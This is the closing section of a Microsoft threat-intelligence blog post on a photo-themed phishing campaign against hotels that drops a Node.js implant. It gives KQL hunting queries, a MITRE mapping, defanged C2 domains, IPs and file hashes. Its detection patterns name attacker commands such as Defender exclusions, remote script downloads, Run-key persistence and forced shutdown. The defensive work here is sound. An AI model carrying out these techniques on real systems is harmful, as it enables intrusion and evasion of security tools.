Microsoft assesses that Microsoft Defender coverage for this campaign is most effective when it combines process, registry, file, and network telemetry rather than relying on blocking individual indicators of compromise (IOCs).&nbsp;



TonRAT is the campaign&#8217;s implant family (validated on the dropped .ps1 and .js payloads). &#8220;Wacatac&#8221; and &#8220;PureRat&#8221; are Microsoft Defender detection names that fire on specific binaries in the attack chain (the LNK or PE payload and the ProgramData persistence executable, respectively).&nbsp;



Beyond signature-based prevention, Microsoft Defender can surface this campaign through behavioral detections, including alerts such as Suspicious Node.js child process execution and Node.js Hidden Run‑Key Persistence, which are designed to identify implant activity even as file names, domains, and script syntax change.&nbsp;



Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog. &nbsp;



Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence. &nbsp;



Tactic&nbsp;Observed activity&nbsp;Microsoft Defender coverage&nbsp;Initial access&nbsp;Photo-themed ZIP with fake image LNK&nbsp;Microsoft Defender for Endpoint&nbsp;Trojan:Win32/Wacatac prevented&nbsp;Execution&nbsp;Obfuscated PowerShell BigInt decoder downloads a .ps1 dropper&nbsp;Microsoft Defender for Endpoint&nbsp;Suspicious PowerShell command lineMicrosoft Defender Antivirus&nbsp;TrojanDropper:PowerShell/TonRAT&nbsp;Node.js runs the decrypted malicious JavaScript implant&nbsp;Microsoft Defender for Endpoint&nbsp;Suspicious Node.js child process execution&nbsp;Microsoft Defender Antivirus&nbsp;Trojan:JS/TonRAT&nbsp;Persistence&nbsp;Dual Run/RunOnce registry keys (Node.js + ProgramData EXE)&nbsp;Microsoft Defender for Endpoint&nbsp;Anomaly detected in ASEP registry&nbsp;Node.js Hidden Run‑Key PersistenceMicrosoft Defender Antivirus&nbsp;Trojan:Win32/PureRat&nbsp;



Microsoft Security Copilot&nbsp;



Microsoft Security Copilot customers can use the following prebuilt promptbooks to support investigation and response for activity related to this campaign:&nbsp;




Incident investigation: Summarize incidents and triage alerts related to Node.js persistence, PowerShell decode chains, and registry modification.





Microsoft User analysis: Profile compromised hospitality accounts (reception, frontdesk, reservations) for scope assessment.




Advanced hunting queries&nbsp;



Microsoft Defender XDR&nbsp;



NOTE: The following sample queries lets you search for a week&#8217;s worth of events. To explore up to 30 days’ worth of raw data to inspect events in your network and locate potential related indicators for more than a week, go to the Advanced Hunting page &gt; Query tab, select the calendar dropdown menu to update your query to hunt for the Last 30 days.    &nbsp;



Fake image shortcut execution (both LNK naming patterns)&nbsp;



This query identifies execution of shortcut files matching the campaign&#8217;s photo-themed LNK naming convention across both Wave 1 and Wave 2 patterns.&nbsp;



DeviceProcessEvents 
| where FileName =~ "explorer.exe" or FileName =~ "cmd.exe" or FileName =~ "powershell.exe" 
| where ProcessCommandLine has ".lnk" 
| where ProcessCommandLine has_any ("IMG-", "PHOTO-") and ProcessCommandLine has ".png.lnk" 
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine 
| order by Timestamp desc



Node.js implant execution from user-space paths&nbsp;



This query identifies Node.js execution from the campaign&#8217;s characteristic AppData\Local\Nodejs\ staging path with JavaScript payload arguments.&nbsp;



DeviceProcessEvents 
| where FileName =~ "node.exe" 
| where FolderPath has @"\AppData\Local\Nodejs\" 
| where ProcessCommandLine has ".js" 
| project Timestamp, DeviceName, FolderPath, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine 
| order by Timestamp desc



.NET DLL compilation from PowerShell-downloaded scripts (Wave 2)&nbsp;



This query detects the Wave 2 attack chain expansion where PowerShell scripts trigger dynamic .NET compilation through csc.exe.



DeviceProcessEvents 
| where FileName in~ ("csc.exe", "cvtres.exe") 
| where InitiatingProcessFileName in~ ("powershell.exe", "pwsh.exe") 
    or InitiatingProcessFolderPath has @"\AppData\Local\Temp\" 
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine 
| order by Timestamp desc



Defender process exclusions followed by Temp execution&nbsp;



This query correlates Defender exclusion modifications with subsequent executable launches from temporary paths within a 30-minute window.&nbsp;



let exclusionEvents = 
DeviceProcessEvents 
| where FileName in~ ("powershell.exe", "pwsh.exe") 
| where ProcessCommandLine has "Add-MpPreference" and ProcessCommandLine has "-ExclusionProcess" 
| project DeviceId, DeviceName, ExclusionTime=Timestamp, ExclusionCmd=ProcessCommandLine; 
let tempExecs = 
DeviceProcessEvents 
| where FolderPath has @"\AppData\Local\Temp\" 
| where FileName endswith ".exe" or ProcessCommandLine has ".exe" 
| project DeviceId, TempExecTime=Timestamp, TempFile=FileName, TempPath=FolderPath, TempCmd=ProcessCommandLine; 
exclusionEvents 
| join kind=inner tempExecs on DeviceId 
| where TempExecTime between (ExclusionTime .. ExclusionTime + 30m) 
| project DeviceName, ExclusionTime, ExclusionCmd, TempExecTime, TempFile, TempPath, TempCmd 
| order by ExclusionTime desc



Installer or unpacker behavior using is-.tmp and silent flags&nbsp;



This query identifies the campaign&#8217;s characteristic use of temporary installer files with silent execution flags.&nbsp;



DeviceProcessEvents 
| where ProcessCommandLine has @"\is-" and ProcessCommandLine has ".tmp" 
| where ProcessCommandLine has_any ("/SL5", "/VERYSILENT") 
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine 
| order by Timestamp desc 



Registry persistence to Node.js and ProgramData&nbsp;



This query detects creation or modification of Run or RunOnce values pointing to the campaign&#8217;s persistence locations.&nbsp;



DeviceRegistryEvents 
| where RegistryKey has @"\Software\Microsoft\Windows\CurrentVersion\Run" 
    or RegistryKey has @"\Software\Microsoft\Windows\CurrentVersion\RunOnce" 
| where RegistryValueData has_any (@"\AppData\Local\Nodejs\", @"\ProgramData\") 
| project Timestamp, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine 
| order by Timestamp desc



Non-standard port beaconing from Node.js or suspicious user-space binaries&nbsp;



This query identifies network connections on the campaign&#8217;s observed C2 ports from suspicious process locations.&nbsp;



DeviceNetworkEvents 
| where RemotePort in (8443, 8445, 8453, 5555, 56001, 56002, 56003) 
| where InitiatingProcessFileName =~ "node.exe" 
    or InitiatingProcessFolderPath has @"\AppData\Local\Temp\" 
    or InitiatingProcessFolderPath has @"\AppData\Local\Nodejs\" 
    or InitiatingProcessFolderPath has @"\ProgramData\" 
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl 
| order by Timestamp desc



Wave 2 .cfd and .bond domain connections&nbsp;



This query detects network connections to the campaign&#8217;s Wave 2 domain infrastructure.&nbsp;



DeviceNetworkEvents 
| where RemoteUrl has_any (".cfd", ".bond", ".click") 
| where RemoteUrl has "photo-" or RemoteUrl has_any ("zloapobikahy23", "higoksbupwou", "aluminiostramuntana") 
| project Timestamp, DeviceName, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine 
| order by Timestamp desc



Browser automation and forced shutdown on previously affected hosts&nbsp;



This query identifies late-stage post-compromise behavior on hosts already showing earlier campaign indicators.&nbsp;



let suspiciousHosts = 
DeviceProcessEvents 
| where FileName =~ "node.exe" and FolderPath has @"\AppData\Local\Nodejs\" 
| distinct DeviceId; 
DeviceProcessEvents 
| where DeviceId in (suspiciousHosts) 
| where ProcessCommandLine has_any ("--headless", "--no-sandbox", "shutdown -s -t 0") 
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine 
| order by Timestamp desc



Calendly-associated notification infrastructure used in phishing delivery&nbsp;



This query identifies emails from the campaign&#8217;s Calendly-associated subdomain with the characteristic display name.&nbsp;



EmailEvents 
 | where SenderMailFromDomain =~ "em1618.calendly.com" 
| where SenderMailFromAddress startswith "bounces+13766497-" or SenderDisplayName has "Booking Manager" 
 | project Timestamp, NetworkMessageId, SenderFromAddress, SenderDisplayName, RecipientEmailAddress, Subject, DeliveryAction, DeliveryLocation, ThreatTypes 
 | order by Timestamp desc



share.google redirect token detection in email URLs&nbsp;



This query detects emails containing share.google redirect URLs, which the campaign uses as an intermediate hop to obscure the final phishing destination.&nbsp;



EmailUrlInfo 
 | where Url contains "share.google/" 
 | join kind=inner EmailEvents on NetworkMessageId 
 | where SenderMailFromDomain has "calendly" or SenderDisplayName has "Booking" 
 | project Timestamp, NetworkMessageId, SenderFromAddress, RecipientEmailAddress, Subject, Url, DeliveryAction 
 | order by Timestamp desc



Calendly redirect URL phishing detection&nbsp;



This query identifies emails containing Calendly redirect URLs that match known campaign patterns, including share.google tokens or photo-*.cfd domains.&nbsp;



EmailUrlInfo 
 | where Url contains "calendly.com/url?q=" 
 | where Url has_any ("share.google", "photo-", ".cfd") 
 | join kind=inner EmailEvents on NetworkMessageId 
 | project Timestamp, NetworkMessageId, SenderFromAddress, SenderDisplayName, RecipientEmailAddress, Subject, Url, DeliveryAction, AuthenticationDetails 
 | order by Timestamp desc



High-frequency file hash hunting (combined Waves 1 and 2)&nbsp;



This query hunts for all known campaign file hashes across endpoint telemetry.



let hashes = dynamic([ 
    "83e970feb3f10692c164f6889f7a026f135c2433e5bf8e662a6e63a3b81267b7", 
    "06a2888c1f07119873ccb051221bd8717281494b33585f4242556e6e5e227969", 
    "04ec44f2618460f5c77c5e56014a512cc03a123c9c5b6b6b1273e2a1681ac2e1", 
    "1c693bcdaf1da636eb21c274b21cc2f6c52c62ddd514700783eee83fe13acb0a", 
    "2e5fd01b7949a45937b853eabcf4b03195614cf84338dcaaa97240d1c5301ddc", 
    "3f66634f103b80412d1d670b91befab2a74425d2ea76d904c4a7ffae2ae94b44", 
    "63565f15a99769bbcd527a4d53e5cc259d80e1254463ef9c878c2074685558ae", 
    "49cc0e0c3ec060fb354cacee244d4f297aaefb6db66e67a21262d6c4d2eae1bd", 
    "6580de3b74fd635a1d7a887b8f6e5b0c9ac9e90d6e20466ad41489203119cca9", 
 
    "f629311734b7c6e6579f8e1d0e1e3f3bf72c9ac6c301b631ba4df7f393c41b14", 
    "98825c0c7764f45c891275b2f038ea559e84b340df30b41c2cc77b8d4215c6c8", 
    "bd6805782df15e53581096b99bd6bbb81f4d4a5e2d2b30954df63175a4075be9", 
    "89934cb1494cf0327f0ab82fe644c74caf687814379cad116bd7adaca74c1028", 
    "1f8daffec5945a13a1e9231f4a76655d4c7ef4560d0c64ca3abfe48f38297cbd", 
    "9f10e3b6e5745784f26d18c38ce01fba054b19749c17260978ac11472564aee2", 
    "97448688b292bfec6d83b153588076fe59b111c35ac4e42a916238df16a71e2f", 
    "c5baa0c16b0074a1e94b48aa0177e9bfc23746aca8a5b42848a6685da85658b5", 
    "b7f46b192cd83a1d2487cb048cca645f6e8855b9673d500d50bbdb04eebc6bea" 
]); 
DeviceFileEvents 
| where SHA256 in (hashes) 
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine 
| order by Timestamp desc



Microsoft Sentinel



Microsoft Sentinel customers can use the Microsoft Defender XDR connector to ingest the above queries or leverage the Threat Intelligence Mapping analytics rule to match campaign IOCs against ingested logs.&nbsp;



MITRE ATT&amp;CK techniques&nbsp;



Tactic&nbsp;Technique ID&nbsp;Technique Name&nbsp;Observed Activity&nbsp;Resource Development&nbsp;&nbsp;T1583.001&nbsp;Acquire Infrastructure: Domains&nbsp;Short-lived .cfd landing domains (photo-26653[.]cfd, photo-26656[.]cfd, photo-27857[.]cfd) are registered and rotated every 2–3 days&nbsp;&nbsp;T1583.006&nbsp;Acquire Infrastructure: Web Services&nbsp;Use of Calendly account (em1618.calendly[.]com) and generated share[.]google redirect tokens to relay phishing&nbsp;&nbsp;T1584.006&nbsp;Compromise Infrastructure: Web Services&nbsp;Suspected use of a compromised legitimate domain (ginrinsou[.]com) as an alternate sending relay&nbsp;&nbsp;Initial Access&nbsp;&nbsp;T1566.002&nbsp;Phishing: Spearphishing Link&nbsp;Calendly notification emails carrying redirect links (observed from late May 2026)&nbsp;T1199&nbsp;Trusted Relationship&nbsp;Authentication laundering through Calendly&#8217;s SendGrid infrastructure&nbsp;Execution&nbsp;&nbsp;T1204.002&nbsp;User Execution: Malicious File&nbsp;User opens fake image LNK (IMG-/PHOTO-*.png.lnk)&nbsp;T1059.001&nbsp;PowerShell&nbsp;Obfuscated bigint decoder downloads .ps1&nbsp;T1059.007&nbsp;JavaScript&nbsp;Node.js implant executes .js payload with C2 domain&nbsp;Defense Evasion&nbsp;T1027&nbsp;Obfuscated Files or Information&nbsp;Seven-phase PowerShell obfuscation evolution&nbsp;&nbsp;T1027.004&nbsp;Compile After Delivery&nbsp;csc.exe compiles .NET DLL on-target (Wave 2)&nbsp;T1036&nbsp;Masquerading&nbsp;LNK files disguised as .png images&nbsp;T1562.001&nbsp;Disable or Modify Tools&nbsp;Add-MpPreference exclusions for Temp EXE files&nbsp;Persistence&nbsp;T1547.001&nbsp;Registry Run Keys / Startup Folder&nbsp;Dual Run (Node.js) + RunOnce (ProgramData EXE)&nbsp;Discovery&nbsp;T1016&nbsp;System Network Configuration Discovery&nbsp;ip-api[.]com geolocation lookup&nbsp;Command &amp; Control&nbsp;T1571&nbsp;Non-Standard Port&nbsp;C2 on ports 8443, 8445, 8453, 5555, 56001-56003&nbsp;



Indicators of compromise&nbsp;



Observed C2 IPs and non-standard ports&nbsp;



Indicator&nbsp;Type&nbsp;Description&nbsp;178.16.54[.]27&nbsp;IP&nbsp;Primary — Active in both waves, ports 56001/56002&nbsp;95.217.97[.]121&nbsp;IP&nbsp;Persistent beacon (Wave 1)&nbsp;193.202.84[.]32&nbsp;IP&nbsp;Secondary (Wave 1)&nbsp;178.16.55[.]179&nbsp;IP&nbsp;Additional (Wave 1)&nbsp;172.67.161[.]215&nbsp;IP&nbsp;phishing TonRAT C2 (Cloudflare shared CDN )&nbsp;8443, 8445, 8453&nbsp;Port&nbsp;Non-standard C2 ports&nbsp;5555&nbsp;Port&nbsp;Non-standard C2 port&nbsp;56001, 56002, 56003&nbsp;Port&nbsp;Non-standard C2 ports&nbsp;



Representative observed domains&nbsp;



Wave 1 domains&nbsp;



Indicator&nbsp;Type&nbsp;Description&nbsp;prejointl[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;safedocphoto[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;recallnine[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;kentjerk[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;photodoc-secure[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;kelopins[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;docstore-safe[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;photosafe-hub[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;dashgamein[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;image-vlt[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;safedoc-storage[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;safe-picvault[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;photo-dekor[.]xyz&nbsp;Domain&nbsp;C2 domain&nbsp;reservebookphot[.]pro&nbsp;Domain&nbsp;C2 domain&nbsp;kellystreets[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;widjssij728dj[.]com&nbsp;Domain&nbsp;C2 domain&nbsp;docshub-01[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;photobookadm[.]pro&nbsp;Domain&nbsp;C2 domain&nbsp;safedoc-vault[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;keypmenu[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;photo-box[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;expedla-getphoto[.]cloud&nbsp;Domain&nbsp;C2 domain&nbsp;vertualstreak[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;montagelips[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;racestrech[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;derbyoni[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;ministrew[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;visaphoto-secure[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;docshub-secure[.]com&nbsp;Domain&nbsp;C2 domain&nbsp;visaimage-storage[.]icu&nbsp;Domain&nbsp;C2 domain&nbsp;lookinlip[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;safephoto-vault[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;kiptownim[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;finallyrain[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;photobook-reserv[.]pro&nbsp;Domain&nbsp;C2 domain&nbsp;bookreservphoto[.]pro&nbsp;Domain&nbsp;C2 domain&nbsp;imagestore-hub[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;visaimages[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;visaphoto-vault[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;visa-vault[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;visa-safedocs[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;joincroud[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;kinghoruswe[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;snapkeep[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;deeprace[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;lestresot[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;recepyman[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;recstrace[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;heliosup[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;fairyspells[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;hakeiwjs727wj[.]com&nbsp;Domain&nbsp;C2 domain&nbsp;haobbao[.]com&nbsp;Domain&nbsp;C2 domain&nbsp;dancamp[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;sec-safe-dc[.]info&nbsp;Domain&nbsp;C2 domain — Active in both waves&nbsp;secure-imagehub[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;doc-imagehub[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;imagevault-safe[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;photo-hub-io[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;safevault-hub[.]info&nbsp;Domain&nbsp;C2 domain&nbsp;tripadvisor-photo-view[.]com&nbsp;Domain&nbsp;C2 domain&nbsp;photo-7216302[.]sbs&nbsp;Domain&nbsp;C2 domain&nbsp;



Wave 2 domains&nbsp;&nbsp;



Indicator&nbsp;Type&nbsp;Description&nbsp;photo-26254[.]cfd&nbsp;Domain&nbsp;&nbsp;Phishing landing page&nbsp;&nbsp;&nbsp;photo-132454[.]cfd&nbsp;Domain&nbsp;&nbsp;Phishing landing page&nbsp;&nbsp;&nbsp;photo-8632454[.]cfd&nbsp;Domain&nbsp;&nbsp;Phishing landing page&nbsp;&nbsp;&nbsp;photo-21473[.]xyz&nbsp;Domain&nbsp;C2 domain&nbsp;photo-7216102[.]click&nbsp;Domain&nbsp;C2 domain&nbsp;zloapobikahy23[.]bond&nbsp;Domain&nbsp;C2 domain&nbsp;higoksbupwou[.]com&nbsp;Domain&nbsp;C2 domain&nbsp;aluminiostramuntana[.]com&nbsp;Domain&nbsp;C2 domain&nbsp;photo-26653[.]cfd&nbsp;Domain&nbsp;Phishing landing page&nbsp;photo-26654[.]cfd&nbsp;Domain&nbsp;Phishing landing page&nbsp;photo-26656[.]cfd&nbsp;Domain&nbsp;Phishing landing page&nbsp;photo-27857[.]cfd&nbsp;Domain&nbsp;Phishing landing page&nbsp;



Microsoft has assigned malicious ratings to these domains, and they are being blocked.&nbsp;



File hashes&nbsp;



Indicator&nbsp;Type&nbsp;Description&nbsp;83e970feb3f10692c164f6889f7a026f135c2433e5bf8e662a6e63a3b81267b7&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;06a2888c1f07119873ccb051221bd8717281494b33585f4242556e6e5e227969&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;04ec44f2618460f5c77c5e56014a512cc03a123c9c5b6b6b1273e2a1681ac2e1&nbsp;SHA-256&nbsp;PE payload (xmnrwv9l.exe) — Same hash in both waves&nbsp;1c693bcdaf1da636eb21c274b21cc2f6c52c62ddd514700783eee83fe13acb0a&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;2e5fd01b7949a45937b853eabcf4b03195614cf84338dcaaa97240d1c5301ddc&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;3f66634f103b80412d1d670b91befab2a74425d2ea76d904c4a7ffae2ae94b44&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;63565f15a99769bbcd527a4d53e5cc259d80e1254463ef9c878c2074685558ae&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;49cc0e0c3ec060fb354cacee244d4f297aaefb6db66e67a21262d6c4d2eae1bd&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;6580de3b74fd635a1d7a887b8f6e5b0c9ac9e90d6e20466ad41489203119cca9&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;da4b72764ae929050353f3da759c839e2a061a8b9a8dd3c3b2e909d4a8a3291c&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;f629311734b7c6e6579f8e1d0e1e3f3bf72c9ac6c301b631ba4df7f393c41b14&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;98825c0c7764f45c891275b2f038ea559e84b340df30b41c2cc77b8d4215c6c8&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;bd6805782df15e53581096b99bd6bbb81f4d4a5e2d2b30954df63175a4075be9&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;89934cb1494cf0327f0ab82fe644c74caf687814379cad116bd7adaca74c1028&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;1f8daffec5945a13a1e9231f4a76655d4c7ef4560d0c64ca3abfe48f38297cbd&nbsp;SHA-256&nbsp;Campaign payload (Wave 1)&nbsp;9f10e3b6e5745784f26d18c38ce01fba054b19749c17260978ac11472564aee2&nbsp;SHA-256&nbsp;IMG-386443483.png.lnk (Wave 2)&nbsp;97448688b292bfec6d83b153588076fe59b111c35ac4e42a916238df16a71e2f&nbsp;SHA-256&nbsp;PHOTO-215746435.png.lnk (Wave 2)&nbsp;c5baa0c16b0074a1e94b48aa0177e9bfc23746aca8a5b42848a6685da85658b5&nbsp;SHA-256&nbsp;qFWe908J.ps1 (419 KB, Wave 2)&nbsp;b7f46b192cd83a1d2487cb048cca645f6e8855b9673d500d50bbdb04eebc6bea&nbsp;SHA-256&nbsp;bjygtujc.dll (3,072 bytes, compiled .NET, Wave 2)&nbsp;d14ba95cdce1ef7dc9ad3ac74949ca5db38b27378ee30f30a23cf26f9e875a11&nbsp;SHA-256&nbsp;node.exe (v24.13.0-win-x64, 89.9 MB)&nbsp;



Key behavioral patterns&nbsp;



Indicator&nbsp;Type&nbsp;Description&nbsp;Pattern A&nbsp;Behavior&nbsp;Obfuscated PowerShell downloader: BigInt decoder → iwr → .ps1&nbsp;Pattern B&nbsp;Behavior&nbsp;.NET DLL compilation: csc.exe → cvtres.exe → &lt;random&gt;.dll (Wave 2)&nbsp;Pattern C&nbsp;Behavior&nbsp;Node.js implant: node.exe &lt;random&gt;.js &lt;domain&gt;&nbsp;Pattern D&nbsp;Behavior&nbsp;Defender exclusion: Add-MpPreference -ExclusionProcess&nbsp;Pattern E&nbsp;Behavior&nbsp;Temp EXE execution: Numerous random filenames&nbsp;Pattern F&nbsp;Behavior&nbsp;Installer or unpacker: *.tmp with /SL5 or /VERYSILENT&nbsp;Pattern G&nbsp;Behavior&nbsp;ProgramData copy: Lowercase, same hash&nbsp;Pattern H&nbsp;Behavior&nbsp;RunOnce loop persistence: Value refreshed after each execution&nbsp;Pattern I&nbsp;Behavior&nbsp;Browser automation: &#8211;headless &#8211;no-sandbox&nbsp;Pattern J&nbsp;Behavior&nbsp;Forced shutdown: cmd /c shutdown -s -t 0&nbsp;Pattern K&nbsp;Behavior&nbsp;Persistence survival: Node.js Run key survives Defender PE block&nbsp;Pattern L&nbsp;Behavior&nbsp;Authentication laundering: Direct-path Calendly email passes SPF/DKIM/DMARC/CompAuth (share.google variant fails authentication)&nbsp;Pattern M&nbsp;&nbsp;&nbsp;Behavior&nbsp;Multi-hop redirect: Calendly → share.google → Google → photo-*.cfd&nbsp;Pattern N&nbsp;Behavior&nbsp;Domain rotation: photo-*.cfd domains with ~2–3 day lifespan&nbsp;



References&nbsp;




Technical Analysis of Suspicious Emails Targeting the Hotel Industry | SOC Prime



ITOCHU&nbsp;Cyber &amp; Intelligence




This research is provided by Microsoft Defender Security Research,  Parth Jamodkar, and&nbsp;with contributions from members of Microsoft Threat Intelligence.



Learn more



For the latest security research from the Microsoft Threat Intelligence community, check out the&nbsp;Microsoft Threat Intelligence Blog.



To get notified about new publications and to join discussions on social media, follow us on&nbsp;LinkedIn,&nbsp;X (formerly Twitter), and&nbsp;Bluesky.



To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the&nbsp;Microsoft Threat Intelligence podcast.



Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.  &nbsp;




Explore how to build and customize agents with Copilot Studio Agent Builder&nbsp;



Microsoft 365 Copilot AI security documentation&nbsp;



How Microsoft discovers and mitigates evolving attacks against AI guardrails&nbsp;



Learn more about securing Copilot Studio agents with Microsoft Defender &nbsp;



Evaluate your AI readiness with our latest&nbsp;Zero Trust for AI workshop.



Learn more about Protect your agents in real-time during runtime (Preview)





The post Photo ZIP campaign targeting hospitality industry delivers Node.js implant for persistent access appeared first on Microsoft Security Blog.

---
*원문: [https://www.microsoft.com/en-us/security/blog/2026/06/25/photo-zip-campaign-targeting-hospitality-industry-delivers-node-js-implant-persistent-access/](https://www.microsoft.com/en-us/security/blog/2026/06/25/photo-zip-campaign-targeting-hospitality-industry-delivers-node-js-implant-persistent-access/)*
